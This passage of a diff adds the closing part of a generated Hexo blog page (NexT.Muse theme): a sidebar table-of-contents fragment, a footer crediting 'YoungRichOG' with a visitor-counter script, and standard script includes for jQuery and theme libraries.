href="#Respect"><span class="nav-number">1.7.</span> <span class="nav-text">Respect</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">YoungRichOG</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv"><br>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
